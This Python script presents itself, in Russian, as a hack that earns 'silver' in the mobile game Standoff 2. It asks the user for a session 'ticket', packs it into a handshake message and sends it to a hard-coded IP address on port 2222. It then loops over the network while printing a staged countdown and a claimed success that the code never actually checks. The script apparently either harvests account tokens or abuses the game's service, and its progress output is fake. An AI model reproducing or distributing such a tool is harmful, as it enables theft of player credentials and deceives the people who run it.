#! /usr/bin/env python
# -*- coding: utf-8 -*-

from colorama import init, Fore
from colorama import Style
from colorama import Back
import socket
import time

init(autoreset=True)

a = input("Введите ticket:")
s = a.replace('  ', '')
m = s.encode("utf-8").hex()
c = "000000740a2435353537333038632d643430312d343334312d613364652d336231386662333030376239121648616e647368616b6552656d6f7465536572766963651a0e70726f746f48616e647368616b6522241a220a20" + m
b = "000000740a2435353537333038632d643430312d343334312d613364652d336231386662333030376239121648616e647368616b6552656d6f7465536572766963651a0e70726f746f48616e647368616b6522241a220a20"
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('52.57.224.107', 2222))
sock.send(bytes.fromhex(c))
time.sleep(0.1)
while 1:
    sock.send(bytes.fromhex(b))
    time.sleep(2)
    print(Style.BRIGHT + Fore.RED + 'Взлом StandOff 2')
    time.sleep(4)
    print(Style.BRIGHT + Fore.RED + 'Осталось 3 Сек')
    time.sleep(6)
    print(Style.BRIGHT + Fore.RED + 'Осталось 2 Сек')
    time.sleep(8)
    print(Style.BRIGHT + Fore.RED + 'Осталось 1 Сек')
    time.sleep(12)
    print(Style.BRIGHT + Fore.RED + 'Вы взломали Standoff 2')
    print(Style.BRIGHT + Fore.RED + 'Вы заработали со Взлома: 600 Серебра')
